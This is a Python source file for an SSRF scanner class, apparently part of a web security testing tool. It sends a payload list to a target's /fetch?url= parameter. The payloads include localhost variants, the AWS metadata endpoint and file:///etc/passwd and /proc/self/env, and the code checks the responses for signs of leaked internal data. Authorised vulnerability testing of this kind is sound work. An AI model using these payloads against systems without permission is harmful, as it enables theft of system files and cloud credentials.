from core.base_scanner import BaseScanner
import urllib.parse

class SSRFScanner(BaseScanner):
    def __init__(self, target_url: str):
        super().__init__(target_url)
        self.ssrf_payloads = self._generate_ssrf_payloads()

    def _generate_ssrf_payloads(self):
        """Generate SSRF test payloads"""
        return [
            # Internal network probing
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            
            # Internal services
            'file:///etc/passwd',
            'file:///proc/self/env',
            
            # Alternative encoding
            'http://[::1]',
            'http://0177.0.0.1',
            
            # DNS rebinding
            'http://127.0.0.1.nip.io'
        ]

    def scan(self):
        vulnerabilities = []
        
        for payload in self.ssrf_payloads:
            # Create test URL with payload
            test_url = urllib.parse.urljoin(
                self.target_url, 
                f'/fetch?url={urllib.parse.quote(payload)}'
            )
            
            response = self._send_request(
                method='GET', 
                path=f'/fetch?url={urllib.parse.quote(payload)}'
            )
            
            if self._detect_ssrf(response, payload):
                vulnerability = {
                    'type': 'Server-Side Request Forgery (SSRF)',
                    'payload': payload,
                    'risk': 'Critical',
                    'description': f"SSRF vulnerability detected with payload: {payload}"
                }
                vulnerabilities.append(vulnerability)
                self.logger.critical(f"SSRF vulnerability: {payload}")

        self.save_results(vulnerabilities)
        return vulnerabilities

    def _detect_ssrf(self, response, payload):
        """Detect potential SSRF vulnerability"""
        # Check response for internal resource indicators
        internal_indicators = [
            'root:', 'bin:', 'home:', 
            'AWS', 'EC2', 'metadata'
        ]
        
        return any(
            indicator in response.text 
            for indicator in internal_indicators
        )